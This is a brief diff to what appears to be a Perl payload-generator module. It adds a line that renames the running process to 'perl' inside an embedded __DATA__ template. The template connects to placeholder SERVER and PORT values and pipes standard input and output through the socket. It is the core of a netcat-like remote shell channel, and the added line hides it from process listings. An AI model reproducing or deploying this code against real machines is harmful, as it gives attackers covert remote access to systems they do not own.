@@ -73,6 +73,7 @@ sub _generate_pnc {
 }
 
 __DATA__
+$0=perl;
 socket($socket, AF_INET, SOCK_STREAM, 0) &&
 connect($socket,  sockaddr_in PORT, inet_aton "SERVER") || die $!;
 fcntl $_, F_SETFL, O_NONBLOCK|fcntl $_, F_GETFL, 0 for @in = (*STDIN, $socket), @out = ($socket, *STDOUT);
